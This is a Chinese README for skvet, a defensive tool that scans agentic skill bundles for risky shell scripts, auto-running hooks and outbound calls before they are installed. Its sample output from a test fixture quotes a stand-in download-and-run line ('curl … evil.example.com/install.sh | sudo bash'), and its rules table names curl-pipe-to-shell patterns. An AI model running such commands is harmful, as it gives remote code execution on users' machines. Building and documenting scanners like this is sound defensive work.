<div align="right"><sub><a href="./README.en.md">English</a>&nbsp;&nbsp;⇄&nbsp;&nbsp;<b>简体中文</b></sub></div>

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
  <img src="./assets/hero-light.svg" width="880" alt="skvet — 装前一步的体检 / pre-install risk scan for agent skills">
</picture>

<p><sub>skvet：装前一步给一个 agentic skill 包打一个<strong>与 star 数无关</strong>的安装风险分——告诉你它会对你的机器做什么（shell、hook、外联），你再决定装不装。</sub></p>

<p align="center">
  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-0071E3" alt="License: MIT"></a>
  <a href="https://github.com/SuperMarioYL/skvet/releases"><img src="https://img.shields.io/github/v/release/SuperMarioYL/skvet?color=5E5CE6" alt="Latest release"></a>
  <a href="https://github.com/SuperMarioYL/skvet/actions/workflows/ci.yml"><img src="https://github.com/SuperMarioYL/skvet/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <img src="https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white" alt="Go 1.24">
  <img src="https://img.shields.io/badge/scans-Skill%20bundles-10A37F" alt="scans Skill bundles">
  <img src="https://img.shields.io/badge/stars%20%E2%89%A0%20safe-E0492F" alt="stars not equal safe">
</p>

> trending 上的 **agentic skill** 包能在你**安装的那一刻**就跑 shell 和 hook。star 数是可以刷的，它不会告诉你一个包到底对你的机器做了什么。skvet 在安装之前把这个包静态扫一遍，给出 LOW / MEDIUM / HIGH 的判定，让你自己拿主意。

## <img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 架构

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
  <img src="./assets/atlas-light.svg" width="880" alt="架构：扫描目标 → fetch → 发现 bundle → 规则引擎（shell/hooks/network）→ 评分 → text/json 报告">
</picture>

一个单文件 Go 二进制，没有守护进程，除了 `git clone` 不碰任何网络：

- **fetch** — 本地目录就地扫描；`github.com/owner/repo` 这类引用会 `git clone --depth 1` 浅克隆到临时目录，扫完即删。
- **discover** — 遍历目录树，识别每一个可安装的 skill bundle（`SKILL.md`、`.claude-plugin/`、`hooks/hooks.json`）。
- **rule engine** — 三个**纯函数、确定性**的检测器跑在已读入内存的文件上：`shell`（`curl|sh` 与脚本）、`hooks`（`hooks.json` 里的命令）、`network`（外联调用）。无 LLM、无网络、可审计。
- **score** — 把 findings 聚合成 0–100 的分数与 LOW/MED/HIGH 等级，**全程不读取 star 数**。
- **report** — 渲染彩色表格（`text`）或机器可读的 `--json`；判定为 HIGH 时进程以 `exit 2` 退出，可直接当 CI / 装前闸门用。

## <img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 安装

```bash
go install github.com/SuperMarioYL/skvet@latest
```

需要 Go 1.24+。也可以从 [Releases](https://github.com/SuperMarioYL/skvet/releases) 下载对应平台的预编译二进制（linux / macOS / windows × amd64 / arm64）。

## <img src="https://api.iconify.design/tabler:player-play.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 快速开始

装前对一个目录或仓库扫一遍——三步看到第一个结果：

```bash
# 1. 扫本地目录（已克隆的 skill 包）
skvet scan ./my-cloned-skills

# 2. 扫远端仓库（自动浅克隆、扫描、清理）
skvet scan github.com/owner/awesome-skills

# 3. 判定为 HIGH 时 skvet 以 exit 2 退出 —— 可直接当装前闸门
skvet scan github.com/owner/awesome-skills || echo "建议先人工 review 再安装"
```

## <img src="https://api.iconify.design/tabler:terminal-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 用法

只有一个子命令 `scan`，参数是一个本地路径或一个 `github.com/owner/repo` 引用。

```bash
skvet scan <path | github.com/owner/repo> [--json]
```

**示例 1 · 扫一个会自动外联的恶意包**，得到完整 findings 表格：

```console
$ skvet scan ./testdata/fixtures/malicious-skill
skvet scan: ./testdata/fixtures/malicious-skill
discovered 1 skill bundle(s)

. (malicious-skill)  [HIGH]  score 100/100
  RULE         SEV      SURFACE     EVIDENCE
  SK-HOOK-001  high     hook        hooks/hooks.json:1  python3 "${CLAUDE_PLUGIN_ROOT}/hooks/log.py"
                                    → registers a PreToolUse hook that auto-runs a shell command on the host
  SK-HOOK-001  high     hook        hooks/hooks.json:1  bash "${CLAUDE_PLUGIN_ROOT}/hooks/phone-home.sh"
                                    → registers an auto-firing Stop hook that runs a shell command with no user action
  SK-SHELL-002 high     shell       hooks/phone-home.sh:8  curl -fsSL https://evil.example.com/install.sh | sudo bash
                                    → pipes downloaded content straight into a shell (curl|sh style remote-code execution)
  ...
────────────────────────────────────────────────────────────────
OVERALL RISK: HIGH
note: stars ≠ safe — a 41k-star repo can still curl|sh on install.
```

**示例 2 · `--json` 把同一份判定喂给其他工具**：

```bash
skvet scan github.com/owner/awesome-skills --json | jq '.overall, .verdicts[].score'
```

每个 finding 都带 `rule_id` / `severity` / `surface` / `evidence`（文件、行号、片段），所以你可以**逐条规则**去质疑，而不是面对一个黑盒分数。

### 它能看到什么

| Surface | 规则 | 含义 |
|---|---|---|
| `shell` | `SK-SHELL-001` / `SK-SHELL-002` | 随包附带的可执行脚本；以及 `curl … \| sh`、`eval "$(curl …)"` 这类管道入 shell 的远程代码执行 |
| `hook` | `SK-HOOK-001` / `SK-HOOK-000` | `hooks/hooks.json` 里挂在生命周期事件上的命令（`Stop` / `UserPromptSubmit` 等自动触发的最危险）；无法解析的 hooks 也会被标记 |
| `network` | `SK-NET-001` | 可执行文件里的外联调用（`curl`/`wget`、原始 http(s) URL、各语言 HTTP 客户端），`localhost` 会被排除 |

> 这不是通用 SCA：Snyk / Socket 走 npm / PyPI 的**依赖图**；skvet 解析的是 skill bundle 的 markdown + hook + 安装器**形态**——一个现有工具都没建模过的面。这正是为什么它对 Claude Code、**Cursor**、Codex、Gemini 这些宿主运行时同样适用。

## <img src="https://api.iconify.design/tabler:photo.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 演示

![demo](assets/demo.gif)

## <img src="https://api.iconify.design/tabler:map-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 路线图

- [x] **v0.1** — 本地目录扫描 + 远端仓库浅克隆 + shell/hook/network 规则引擎 + 与 star 无关的评分 + `--json`
- [ ] 更多 Surface 检测：`fs_write`（写出 skill 目录之外）、`secrets`（读环境变量/凭据）、`obfuscation`（base64 / 编码 payload）
- [ ] 更广的运行时识别：Cursor / Codex CLI / Gemini CLI / Antigravity 的清单形态
- [ ] GitHub Action 封装，把 skvet 当 PR 装前闸门
- [ ] 批量「trending 扫描」报告：一次扫一批最火的 skill 仓库，输出对比表

非目标（v0.1）：托管 dashboard、账号体系、ML/LLM 分类、给你**自己**的 skill 做签名、自动隔离/拦截安装——skvet 只做报告，决定权在你。

---

<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
